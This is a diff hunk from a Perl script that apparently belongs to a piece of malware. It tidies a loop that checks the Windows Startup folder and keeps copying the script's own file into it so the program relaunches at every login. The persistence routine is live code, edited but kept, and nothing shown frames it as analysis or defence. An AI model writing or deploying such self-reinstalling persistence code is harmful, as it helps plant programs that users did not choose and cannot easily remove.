@@ -103,12 +103,10 @@ use Config;
 
 ### Modules ###
 
-my $arq = basename($0);
-
 while(1){
   my $check = qx/dir %AppData%\\\\Microsoft\\\\Windows\\\\"Start Menu"\\\\Programs\\\\Startup/;
-  while($check !~ m/$arq/){
-    system(\'copy \' . $arq . \' %AppData%\\Microsoft\\Windows\\"Start Menu"\\Programs\\Startup\');
+  while($check !~ basename($0)){
+    system(\'copy \' . basename($0) . \' %AppData%\\Microsoft\\Windows\\"Start Menu"\\Programs\\Startup\');
     $check = qx/dir %AppData%\\\\Microsoft\\\\Windows\\\\"Start Menu"\\\\Programs\\\\Startup/;
   }
   $check = qx/dir %AppData%/;
